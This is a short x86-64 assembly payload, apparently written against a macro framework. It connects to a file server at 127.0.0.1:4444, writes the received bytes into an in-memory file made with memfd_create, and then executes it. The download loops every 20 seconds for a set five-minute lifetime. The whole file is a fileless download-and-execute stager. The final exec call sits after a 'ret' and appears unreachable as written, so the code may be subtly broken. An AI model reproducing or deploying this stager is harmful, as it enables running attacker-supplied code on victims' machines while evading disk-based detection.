BITS 64
%include "bmj.asm"
section .text
global _start
_start:

    set_ttl 5, MINUTES          ; We specify operational time of the payload using a pre-defined time constant
                                ; After this time, current process receives SIGALRM and exits

    infinite_loop file_download, 20, SECONDS 

file_download:           
    push SYS_SOCKET
    pop rax         
    push AF_INET
    pop rdi         
    push SOCK_STREAM
    pop rsi         
    xor rdx, rdx    
    syscall         
    push rax
    pop r11                     ; Save socket's fd for later use
    sock_connect2 "127.0.0.1", 4444
                                ; File server's details specified above
    memfd_create                ; Create an in-memory file descriptor, and return it in RAX
    push rax
    pop r12
    fd2fd                       ; Read contents from one file descriptor and write to another
                                ; Explicit operands are r11 (source) and r12 (destination), but any registers can be used
    ret                         ; Remember to end the 'file_download:' label flow with a 'ret' instruction
    fd_exec r12
